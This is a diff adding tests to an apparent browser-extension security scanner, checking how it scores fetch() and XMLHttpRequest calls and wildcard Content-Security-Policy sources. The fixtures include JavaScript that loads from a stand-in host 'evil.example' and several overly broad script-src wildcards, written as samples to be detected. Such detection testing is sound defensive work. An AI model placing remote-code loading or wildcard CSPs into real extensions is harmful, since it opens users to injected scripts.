@@ -215,6 +215,69 @@ def test_javascript_detector_findings(source, expected_code):
     assert expected_code in _finding_codes(result)
 
 
+def test_bare_xhr_constructor_is_not_remote_code():
+    # A bare `new XMLHttpRequest` says nothing about the destination; an extension
+    # loading its own bundled resource must not score as remote code (#151) — and must
+    # behave like the equivalent fetch(), which already scored 0.
+    data = make_zip(
+        {
+            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
+            "bg.js": "const x = new XMLHttpRequest(); x.open('GET', 'data/config.json'); x.send();",
+        }
+    )
+    result = inspect_package(data)
+    assert result.uses_remote_code is False
+    assert "remote_xhr" not in _finding_codes(result)
+
+
+def test_local_and_remote_fetch_parity():
+    # fetch() and XHR now agree: a local (bundled) resource scores 0, a remote one flags.
+    def check(source):
+        return inspect_package(
+            make_zip(
+                {
+                    "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
+                    "bg.js": source,
+                }
+            )
+        )
+
+    assert check("fetch('data/config.json');").uses_remote_code is False
+    assert check("fetch('https://evil.example/x');").uses_remote_code is True
+    assert check("var x = new XMLHttpRequest(); x.open('GET', 'https://evil.example/x');").uses_remote_code is True
+
+
+def _csp_manifest(csp: str) -> bytes:
+    return make_zip(
+        {
+            "manifest.json": json.dumps(
+                {"manifest_version": 2, "name": "x", "version": "1", "content_security_policy": csp}
+            ),
+        }
+    )
+
+
+def test_scoped_wildcard_subdomain_csp_not_flagged_broad():
+    # https://*.googleapis.com is a scoped subdomain wildcard — a legitimate, common
+    # historical MV2 pattern — and must NOT be flagged as a broad wildcard source (#151).
+    result = inspect_package(_csp_manifest("script-src 'self' https://*.googleapis.com"))
+    assert "csp_wildcard_script_source" not in _finding_codes(result)
+
+
+@pytest.mark.parametrize(
+    "csp",
+    [
+        "script-src *",  # bare wildcard
+        "script-src 'self' https://*",  # whole-host wildcard
+        "script-src 'self' https://*:443",  # whole-host wildcard with port
+        "script-src 'self' https://*/scripts",  # whole-host wildcard with path
+    ],
+)
+def test_whole_host_wildcard_csp_flagged_broad(csp):
+    result = inspect_package(_csp_manifest(csp))
+    assert "csp_wildcard_script_source" in _finding_codes(result)
+
+
 def test_manifest_risk_findings():
     data = make_zip(
         {
